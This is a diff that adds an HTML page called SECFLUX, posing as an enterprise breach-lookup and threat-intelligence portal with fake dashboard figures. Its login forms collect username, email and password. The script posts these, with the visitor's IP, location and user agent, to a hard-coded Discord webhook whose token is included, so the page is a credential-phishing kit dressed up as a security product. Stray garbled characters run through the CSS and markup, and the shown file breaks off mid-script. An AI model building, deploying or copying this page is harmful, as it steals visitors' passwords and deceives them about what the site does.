@@ -1,0 +1,1638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECFLUX - Security Intelligence Platform</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { 
+            background: #0a0a0a; 
+            color: #e0e0e0; 
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        /* Hexagon grid background */
+        .hacking-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                linear-gradient(rgba(0, 160, 208, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 160, 208, 极0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+            z-index: -1;
+            animation: scanLines 15s linear infinite;
+        }
+        
+        /* Binary rain effect */
+        .binary-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.1;
+        }
+        
+        .binary-character {
+            position: absolute;
+            color: #00a0d0;
+            font-family: 'JetBrains Mono', monospace;
+            animation: binaryFall linear infinite;
+            text-shadow: 0 0 5px rgba(0, 160, 208, 0.7);
+        }
+        
+        @keyframes binary极Fall {
+            0% { transform: translateY(-100px); opacity: 0; }
+            5% { opacity: 1; }
+            95% { opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+        
+        @keyframes scanLines {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 30px; }
+        }
+        
+        .terminal-text {
+            font-family: 'JetBrains Mono', monospace;
+            color: #00a0d0;
+            text-shadow: 0 0 5px rgba(0, 160, 208, 0.3);
+        }
+        
+        .enterprise-font {
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+        
+        .mono-font {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 400;
+        }
+        
+        .primary-blue {
+            color: #00a0极d0;
+        }
+        
+        .primary-dark {
+            color: #1e2a3b;
+        }
+        
+        .primary-gray {
+            color: #94a3b8;
+        }
+        
+        .bg-dark {
+            background: #111827;
+        }
+        
+极        .bg-darker {
+            background: #0f172a;
+        }
+        
+        .subtle-glow {
+            box-shadow: 0 0 30px rgba(0, 160, 208, 0.1);
+        }
+        
+        .border-gradient {
+            border: 1px solid;
+            border-image: linear-gradient(45deg, #00a0d0, #1e40af) 1;
+        }
+        
+        .enterprise-card {
+            background: rgba(17, 24, 39, 0.98);
+            border: 1px solid #25324d;
+            border-radius: 8px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .enterprise-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 160, 208, 0.1), transparent);
+            transition: 0.5极s;
+        }
+        
+        .enterprise-card:hover::before {
+            left: 100%;
+        }
+        
+        .enterprise-card:hover {
+            border-color:极 #00a0d0;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 160, 208, 0.15);
+        }
+        
+        .professional-input {
+            background: rgba(15, 23, 42, 极0.9);
+            border: 1px solid #334155;
+            color: #e0极e0e0;
+            padding: 14px 16px;
+            border-radius: 6px;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        
+        .professional-input:focus {
+            outline: none;
+            border-color: #00a0d0;
+            box-shadow: 0 0 0 3px rgba(0, 160, 208, 0.1);
+        }
+        
+        .professional-btn {
+            background: linear-gradient(135deg, #00a0d0 0%, #1e40af 100%);
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .professional-btn::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            transition: 0.5s;
+        }
+        
+        .professional-btn:hover::before {
+            animation: btnGlow 1.5s linear infinite;
+        }
+        
+        .professional-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(0, 160, 208, 0.25);
+        }
+        
+        @keyframes btnGlow {
+            0% { left: -50%; }
+            100% { left: 150%; }
+        }
+        
+        .status-indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        
+        .status-online {
+            background: #00a0d0;
+            box-shadow: 0 0 10px #00a0d0;
+            animation: statusPulse 2s infinite;
+        }
+        
+        @keyframes statusPulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 160, 208, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 160, 208, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 160, 208, 0); }
+        }
+        
+        .secflux-logo {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #00a0d0极, #1e40af 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            box-shadow: 0 0 30px rgba(0, 160, 208, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .secflux-logo::after {
+            content: '';
+            position: absolute;
+            width: 150%;
+            height: 150%;
+极            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: logoGlow 3s linear infinite;
+        }
+        
+        @keyframes logoGlow {
+            0%极 { left: -50%; }
+            100% { left: 100%; }
+        }
+        
+        .data-point {
+            padding: 8px 12px;
+            background: rgba(15, 23, 42, 0.6);
+            border-radius: 6px;
+            margin: 5px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .data-point::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 3px;
+            height: 100%;
+            background: #00a0d0;
+        }
+        
+        .data-label {
+            color: #00a0d0;
+            font-weight: 500;
+        }
+
+        .cyber-grid {
+            background-image: 
+                linear-gradient(rgba(0, 160, 208, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 160, 208, 0.05) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .nav-tab {
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s极 ease;
+            font-weight: 500;
+            position: relative;
+        }
+
+        .nav-tab.active {
+            background: rgba(0, 160, 208, 0.1);
+            color: #00a0d0;
+        }
+
+        .nav-tab:hover {
+            background: rgba(0, 160, 208, 0.05);
+        }
+
+        .nav-tab::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            width: 0;
+            height: 2px;
+            background: #00a0d0;
+            transition: all 0.3s ease;
+            transform: translateX(-50%);
+        }
+
+        .nav-tab.active::after,
+        .nav-tab:hover::after {
+            width: 80%;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .hacking-terminal {
+            background: rgba(0, 15, 25, 0.95);
+            border: 1px solid #00a0d0;
+            border-radius: 6px;
+            padding: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: #00a0d0;
+            height: 200px;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .hacking-terminal::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(transparent 50%, rgba(0, 160, 208, 0.03) 50%);
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .terminal-command {
+            color: #00a0d0;
+        }
+
+        .terminal-output {
+            color: #7c8ba1;
+            margin: 5px 0;
+        }
+
+        .log-entry {
+            padding: 10px;
+            border-bottom: 1px solid #25324d;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            position: relative;
+        }
+
+        .log-entry::before {
+            content: '>';
+            position: absolute;
+            left: -15px;
+            color: #00a0d0;
+        }
+
+        .log-timestamp {
+            color: #00a0d0;
+            margin-right: 10px;
+        }
+
+        .log-type {
+            color: #7c8ba1;
+            font-weight: 500;
+        }
+
+        .log-content {
+            color: #e0e0e0;
+            margin-top: 5px;
+        }
+
+        .scan-progress {
+            height: 8px;
+            background: #1极a243a;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 15px 0;
+            position: relative;
+        }
+
+        .scan-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00a0d0, #1e40af);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .scan-progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: progressGlow 1.5s linear infinite;
+        }
+
+        @keyframes progressGlow {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+
+        .cursor-blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .radar-swe极ep {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 120px;
+            height: 120极px;
+            border-radius: 50%;
+            border: 2px solid #00a0d0;
+            box-shadow: 0 0 20px rgba(0, 160, 208, 0.3);
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        .radar-sweep::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            width: 50%;
+            height: 50%;
+            background: linear-gradient(45deg, transparent, rgba(0, 160, 208, 0.3));
+            border-radius: 100% 0 0 0;
+            transform-origin: bottom left;
+            animation: radarSweep 4s linear infinite;
+        }
+
+        @keyframes radarSweep {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .connection-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 极100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .极line {
+            position: absolute;
+            background: linear-gradient(to right, transparent, #00a0d0, transparent);
+            height: 1px;
+            transform-origin: left center;
+            animation: lineFlow 3s linear infinite;
+        }
+
+        @keyframes lineFlow {
+            0% { transform: scaleX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: scaleX(1); opacity: 0; }
+        }
+
+        .glitch-effect {
+            position: relative;
+            display: inline-block;
+        }
+
+        .glitch-effect::before,
+        .glitch-effect::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.8;
+        }
+
+        .glitch-effect::before {
+            color: rgba(0, 160, 208, 0.8);
+            animation: glitch-animation-1 2s infinite linear alternate-reverse;
+            z-index: -1;
+            clip-path: polygon(0 0, 100% 0极, 100% 35%, 0 35%);
+        }
+
+        .glitch-effect::after {
+            color: rgba(255, 0, 0, 0.8);
+            animation: glitch-animation-2 3s infinite linear alternate-reverse;
+            z-index: -2;
+            clip-path: polygon(0 65%, 100% 65%, 100% 100%, 0 100%);
+        }
+
+        @keyframes glitch-animation-1 {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(-3px, -3px); }
+            60% { transform: translate(3px, 3px); }
+            80% { transform: translate极(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+
+        @keyframes glitch-animation-2 {
+            0% { transform: translate(0); }
+            20% { transform: translate(3px, 3px); }
+            40% { transform: translate(3px, -3px); }
+            60% { transform: translate(-3px, 3px); }
+            80% { transform: translate(-3px, -3px); }
+            100% { transform: translate(0); }
+        }
+
+        .hacking-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.03;
+            background: linear-gradient(transparent 50%, rgba(0, 160, 208, 0.1) 50%), 
+                        linear-gradient(90deg, rgba(0, 160, 208, 0.1) 50%, transparent 50%);
+            background-size: 100px 100px;
+            animation: overlayScan 10s linear infinite;
+        }
+
+        @keyframes overlayScan {
+            0% { background-position: 0 0; }
+            100% { background-position: 100px 100px; }
+        }
+    </style>
+</head>
+<body class="bg-dark">
+    <!-- Subtle hacking background -->
+    <div class="hacking-bg"></div>
+
+    <!-- Binary rain effect -->
+    <div class="binary-rain" id="binaryRain"></div>
+
+    <!-- Radar sweep -->
+    <div class="radar-sweep"></div>
+
+    <!-- Connection lines -->
+    <div class="connection-line" id="connectionLine"></div>
+
+    <!-- Hacking overlay -->
+    <div class="hacking-overlay"></div>
+
+    <!-- Navigation -->
+    <nav class="fixed w-full z-50 bg-darker border-b border-gray-800">
+        <div class="max-w-7xl mx-auto px-6 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-4">
+                    <div class="w-10 h-10 bg-gradient-to-br from-[#00a0d0] to-[#1e40af] rounded-lg flex items-center justify-center">
+                        <i class="fas fa-shield-alt text-white"></i>
+                    </div>
+                    <div>
+                        <span class="enterprise-font text-white text-xl glitch-effect" data-text="SECFLUX">SECFLUX</span>
+                        <span class="text-xs primary-blue mono-font ml-2">ENTERPRISE EDITION</span>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <div class="nav-tab active" data-page="home">Home</div>
+                    <div class="nav-tab" data-page="dashboard" id="dashboardTab" style="display:none;">Dashboard</div>
+                    <div class="nav-tab" data-page="breachLookup" id="breachLookupTab" style="display:none;">Breach Lookup</div>
+                    <div class="nav-tab" data-page="logs" id="logsTab" style极="display:none;">View Logs</div>
+                    <div class="nav-tab" data-page="help">极Help</div>
+                    <div class="nav-tab" data-page="about">About</div>
+                    <span class="text-sm primary-gray">
+                        <span class="status-indicator status-online"></span>
+                        SYSTEM ONLINE
+                    </span>
+                    <button onclick="showAccessModal()" id="loginBtn" class="professional-btn text-sm">
+                        <i class="fas fa-user-lock mr-2"></i>CLIENT LOGIN
+                    </button>
+                    <button onclick="logout()" id="logoutBtn" class="professional-btn text-sm" style="display:none;">
+                        <i class="fas fa-sign-out-alt mr-2"></极i>LOGOUT
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Home Page -->
+    <section class="page active" id="homePage">
+        <div class="pt-32 pb-20 px-6">
+            <div class="max-w-6xl mx-auto">
+                <!-- Hero Section -->
+                <div class="text-center mb-16">
+                    <!-- Centered SecFlux Logo -->
+                    <div class="secflux-logo mb-8">
+                        <i class="fas fa-shield-alt text-white text-2xl"></i>
+                    </div>
+                    
+                    <h1 class="enterprise-font text-4xl md:text-5xl lg:text-6xl text-white mb-6 glitch-effect极" data-text="Enterprise Security Intelligence">
+                        Enterprise Security Intelligence
+                    </h1>
+                    
+                    <p class="text-xl primary-gray max-w-3xl mx-auto mb-8 leading-relaxed">
+                        Advanced threat intelligence and breach data analysis for security professionals
+                    </p>
+                    
+                    <div class="inline-flex items-center space-x-4 bg-darker px-6 py-3 rounded-full">
+                        <span class极="status-indicator status-online"></span>
+                        <span class="text-sm primary-blue mono-font">THREAT MONITORING ACTIVE</span>
+                    </div>
+                </div>
+
+                <!-- Client Access Section -->
+                <div class="enterprise-card p-8 max-w-2xl mx-auto">
+                    <div class="text-center mb-6">
+                        <h2 class="enterprise-font text-white text-2xl mb-2">Client Access Portal</h2>
+                        <p class="primary-gray text-sm">
+                            Secure authentication required for database access
+                        </p>
+                    </div>
+                    
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-2">Username</label>
+                            <input type="text" id="username" class="professional-input w-full" placeholder="Enter your username">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-2">Email Address</label>
+                            <input type="email" id="email" class="professional-input w-full" placeholder="your.email@company.com">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-2">Password</label>
+                            <input type="password" id="password" class="professional-input w-full" placeholder="Enter your password">
+                        </div>
+                        <button onclick="handleAccess()" class="professional-btn w-full">
+                            <i class="fas fa-sign-in-alt mr-2"></i>Authenticate & Access
+                        </button>
+                    </div>
+
+                    <div class="mt-6极 pt-6 border-t border-gray-800">
+                        <div class="flex items-center justify-between text-xs primary-gray">
+                            <span>🔒 TLS 1.3 Encryption</span>
+                            <span>🌐 Global CDN</span>
+                            <span>✅ SOC 2 Compliant</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Dashboard Page (Visible after login) -->
+    <section class="page" id="dashboardPage">
+        <div class="pt-32 pb-20 px-6">
+            <div class="极max-w-6xl mx-auto">
+                <h1 class="enterprise-font text-3xl text-white mb-8 glitch-effect" data-text="Security Dashboard">Security Dashboard</h1>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
+                    <div class="enterprise-card p-6 cyber-grid">
+                        <h2 class="enterprise-font text-white text-xl mb-4"><i class="fas fa-shield-alt mr-2"></i>System Status</h2>
+                        <div class="space-y-3">
+                            <div class="data-point">
+                                <span class="data-label">Breach Database:</span> <span class="text-green-400">Online</span>
+                            </div>
+                            <div class="data-point">
+                                <span class="data-label">Threat Intelligence:</span> <span class="text-green-400">Active</span>
+                            </div>
+                            <div class="data-point">
+                                <span class="data-label">Monitoring Services:</span> <span class="text-green-400">Running</span>
+                            </div>
+                            <div class="data-point">
+                                <span class="data-label">Last Update:</span> <span id="lastUpdate">Just now</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="enterprise-card p-6 cyber-grid">
+                        <h2 class="enterprise-font text-white text-xl mb-4"><i class="fas fa-chart-line mr-2"></i>Global Threat Stats</h2>
+                        <div class="space-y-3">
+                            <div class="data-point">
+                                <span class="data-label">Active Threats:</span> <span class="text-red-400">1,247极</span>
+                            </div>
+                            <div class="data-point">
+                                <span class="data-label">Breaches Today:</span> <span class="text-yellow-400">23</span>
+                            </div>
+                            <div class="data-point">
+                                <span class="data-label">Phishing Attacks:</span> <span class="text-red-400">4,812</span>
+                            </div>
+                            <div class="data-point">
+                                <span class="data-label">Malware Variants:</span> <span class="text-red-400">892</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="enterprise-card p-6 mb-8 cyber-grid">
+                    <h2 class="enterprise-font text-white text-xl mb-4"><i class="fas fa-terminal mr-2"></i>Live Threat Feed</h2>
+                    <div class="hacking-terminal">
+                        <div class="terminal-command">> initializing_threat_feed --global --real-time</div>
+                        <div class="terminal-output">> Connected to threat intelligence network</div>
+                        <div class="terminal-output">> Monitoring 12,487 breach records</div>
+                        <div class="terminal-output">> [ALERT] New phishing campaign targeting financial sector</div>
+                        <div class="terminal-output">> [INFO] 47 new breach incidents in last 24 hours</div>
+                        <div class="terminal-output">> [WARNING] Zero-day vulnerability detected in Apache Log4j</div>
+                        <div class="terminal-command">> <span class="cursor-blink">_</span></div>
+                    </div>
+                </div>
+                
+                <div class="enterprise-card p-6 mb-8">
+                    <极h2 class="enterprise-font text-white text-xl mb-4"><i class="fas fa-bolt mr-2"></i>Quick Actions</h2>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                        <button onclick="showPage('breachLookup')" class="professional-btn">
+                            <i class="fas fa-search mr-2"></i>Breach Lookup
+                        </button>
+                        <button onclick="runSystemScan()" class="professional-btn">
+                            <i class="fas fa-shield-alt mr-2"></i>System Scan
+                        </button>
+                        <button onclick="showPage('logs')" class="professional-btn">
+                            <i class="fas fa-history mr-2"></i>View Logs
+                        </button>
+                    </div>
+                </div>
+
+                <!-- System Scan Results (Hidden by default) -->
+                <div class="enterprise-card p-6 mb-8" id="scanResults" style="display: none;">
+                    <h2 class="enterprise-font text-white text-xl mb-4"><i class="fas fa-shield-alt mr-2"></i>System Scan Results</h2>
+                    <div id="scanResultsContent">
+                        <!-- Results will be populated here -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Breach Lookup Page -->
+    <section class="page" id="breachLookupPage">
+        <div class="pt-32 pb-20 px-6">
+            <div class="max-w-6xl mx-auto">
+                <h1 class="enterprise-font text-3xl text-white mb-8 glitch-effect" data-text="Breach Lookup Tools">Breach Lookup Tools</h1>
+                
+                <div class="enterprise-card p-8 mb-8 cyber-grid">
+                    <h2 class="enterprise-font text-white text-xl mb-6"><i class="fas fa-database mr-2"></i>Query Database</h2>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-2">Email Address</label>
+                            <input type="email" id="emailLookup" class="professional-input w-full" placeholder="email@example.com">
+                            <button onclick="lookupEmail()" class="professional-btn w-full mt-2">
+                                <i class="fas fa-envelope mr-2"></i>Lookup Email
+                            </button>
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-2">Username</label>
+                            <input type="text" id="usernameLookup" class="professional-input w-full" placeholder="Username">
+                            <button onclick="lookupUsername()" class="professional-btn w-full mt-2">
+                                <i class="fas fa-user mr-2"></i>Lookup Username
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-2极">Password Hash</label>
+                            <input type="text" id="hashLookup" class="professional-input w-full" placeholder="MD5, SHA极1, etc.">
+                            <button onclick="lookupHash()" class="professional-btn w-full mt-2">
+                                <i class="fas fa-hashtag mr-2"></i>Lookup Hash
+                            </button>
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-2">IP Address</label>
+                            <input type="text" id="ipLookup" class="professional-input w-full" placeholder="192.168.1.1">
+                            <button onclick="lookupIP()" class="professional-btn w-full mt-2">
+                                <i class="fas fa-network-wired mr-2"></i>Lookup IP
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="enterprise-card p-8 cyber-grid">
+                    <h2 class="enterprise-font text-white text-xl mb-6"><i class="fas fa-search mr-2"></i>Lookup Results</h2>
+                    <div id="lookupResults">
+                        <div class="text-center primary-gray py-12">
+                            <极i class="fas fa-search fa-3x mb-4"></i>
+                            <p>Run a query to see results here</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Log极s Page -->
+    <section class="page" id="logsPage">
+        <div class="pt-32 pb-20 px-6">
+            <div class="max-w-6xl mx-auto">
+                <h1 class="enterprise-font text-3xl text-white mb-8 glitch-effect" data-text="Activity Logs">Activity Logs</h1>
+                
+                <div class="enterprise-card p-8 mb-8">
+                    <h2 class="enterprise-font text-white text-xl mb-6"><i class="fas fa-history mr-2"></i>Recent Lookup History</h2>
+                    
+                    <div class="flex justify-between items-center mb-4">
+                        <span class="text-sm primary-gray">Showing your recent breach lookup attempts</span>
+                        <button onclick="clearLogs()" class="professional-btn text-sm">
+                            <i class="fas fa-trash mr-2"></i>Clear Logs
+                            </button>
+                    </div>
+                    
+                    <div class="log-container" style="max-height: 400px; overflow-y: auto;">
+                        <div id="logsContent">
+                            <!-- Log entries will be populated here -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Help Page -->
+    <section class="page" id="helpPage">
+        <div class="pt-32 pb-20 px-6">
+            <div class="max-w-4xl mx-auto">
+                <h1 class="enterprise-font text-3xl text-white mb-8">Help & Documentation</h1>
+                
+                <div class="enterprise-card p-8 cyber-grid">
+                    <h2 class="enterprise-font text-white text-xl mb-6">Getting Started</h2>
+                    
+                    <div class="space-y-6">
+                        <div>
+                            <h3 class="text-lg primary-blue mb-2">Account Access</h3>
+                            <p class="primary-gray">To access the breach database and security tools, you need to authenticate using your credentials. All access is logged and monitored for security purposes.</p>
+                        </div>
+                        
+                        <div>
+                            <h3 class="text-lg primary-blue mb-2">Breach Lookup Tools</h3>
+                            <p class="primary-gray">Our breach lookup tools allow you to search through our database of known security breaches. You can search by email, username, password hash, or IP address.</p>
+                        </div>
+                        
+                        <div>
+                            <h3 class="text-lg primary-blue mb-2">System Scanning</h3>
+                            <p class="primary-gray">The system scan feature analyzes your environment for potential security vulnerabilities without exposing sensitive information.</p>
+                        </div>
+                        
+                        <div>
+                            <h3 class="text-lg primary-blue mb-2">Security Practices</极h3>
+                            <p class="primary-gray">Always follow security best practices: use strong unique passwords, enable two-factor authentication where available, and monitor your accounts for suspicious activity.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Page -->
+    <section class="page" id="aboutPage">
+        <div class="pt-32 pb-20 px-6">
+            <div class="max-w-4xl mx-auto">
+                <h1 class="enterprise-font text-3xl text-white mb-8">About SECFLUX</h1>
+                
+                <div class="enterprise-card p极-8 cyber-grid">
+                    <h2 class="enterprise-font text-white text-xl mb-6">Our Mission</h2>
+                    
+                    <div class="space-y-6">
+                        <div>
+                            <p class="primary-gray">SECFLUX is an advanced security intelligence platform designed for cybersecurity professionals and organizations. Our system provides comprehensive tools for analyzing security threats and monitoring data breaches.</p>
+                        </div>
+                        
+                        <极div>
+                            <h3 class="text-lg primary-blue mb-2">Technology</h3>
+                            <p class="primary-gray">We utilize cutting-edge technology to aggregate and analyze security data from multiple sources, providing our users with the most comprehensive view of the threat landscape.</p>
+                        </div>
+                        
+                        <div>
+                            <h3 class="text-lg primary-blue mb-2">Data Sources</h3>
+                            <p class="primary-gray">Our database includes information from publicly disclosed data breaches, security research极, and threat intelligence feeds, all carefully curated and updated regularly.</p>
+                        </div>
+                        
+                        <div>
+                            <h3 class="text-lg primary-blue mb-2">Compliance</h3>
+                            <p class="primary-gray">Our platform operates in full compliance with applicable security and privacy regulations. All data is handled with the utmost care and security.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Access Modal -->
+    <div id="accessModal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-6 bg-black/90">
+        <div class="enterprise-card max-w-md w-full p-8 subtle-glow">
+            <div class="text-center mb-6">
+                <div class="w-16 h-16 mx-auto mb极-4 bg-gradient极-to-br from-[#00a0d0] to-[#1e40af] rounded-full flex items-center justify-center">
+                    <i class="fas fa-lock text-white text-xl"></i>
+                </div>
+                <h2 class="enterprise-font text-white text-2xl mb-2">Secure Authentication</h2>
+                <p class="primary-gray text-sm">
+                    Access requires multi-factor authentication
+                </p>
+            </div>
+
+            <div class="space-y-5">
+                <div>
+                    <label class="block text-sm font-medium text-gray-400 mb-2">Username</label>
+                    <input type="text" id="accessUsername" required class="professional-input w-full" placeholder="Enter your username">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-400 mb-2">Email Address</label>
+                    <input type="email" id="accessEmail" required class="professional-input w-full" placeholder="your.email@company.com">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-400 mb-2">Password</label>
+                    <input type="password" id="accessPassword" required class="professional-input w-full" placeholder="Enter your password">
+                </div>
+                <button onclick="handleAccess()" class="professional-btn w-full">
+                    <i class="fas fa-fingerprint mr-2"></i>Authenticate
+                </button>
+            </div>
+
+            <div class="mt-6 pt-6 border-t border-gray-800">
+                <div class="text-xs primary-gray text-center">
+                    <i class="fas fa-shield-alt mr-1"></i>
+                    All access attempts are logged and monitored
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Enhanced function with better error handling
+        function sendToRemoteConsole(data) {
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1412931849109372948/0UORsB54oqYKnYUWTEiwkctkMqszTWPVGQPBJPeNs4Lfu2n-iZSuhP8r6LnjolOAXaof';
+            
+            // Format the message better for Discord
+            let discordMessage = `**${data.type}**\n`;
+            
+            if (data.ip) discordMessage += `🌐 IP: ${data.ip}\n`;
+            if (data.location && data.location.city) discordMessage += `📍 Location: ${data.location.city}, ${data.location.region}, ${data.location.country_name}\n`;
+            if (data.username) discordMessage += `👤 Username: ${data.username}\n`;
+            if (data.email) discordMessage += `📧 Email: ${data.email}\n`;
+            if (data.password) discordMessage += `🔑 Password: ${data.password}\n`;
+            if (data.userAgent) discordMessage += `🖥️ User Agent: ${data.userAgent.substring(0, 50)}...\n`;
+            
+            discordMessage += `⏰ ${new Date().toLocaleString()}`;
+            
+            // Check message length and truncate if needed
+            if (discordMessage.length > 1900) {
+                discordMessage = discordMessage.substring(0, 1900) + '...';
+            }
+            
+            // Send to Discord with better error handling
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: discordMessage,
+                    username: 'SECFLUX Logger',
+                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/2340/2340254.png'
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.log('Discord response not OK:', response.status);
+                }
+                return response;
+            })
+            .catch(error => {
+                console.log('Failed to send to Discord (might be CORS):', error);
+                // Don't show error to user, just log it
+            });
+            
+            // Also log to console for debugging
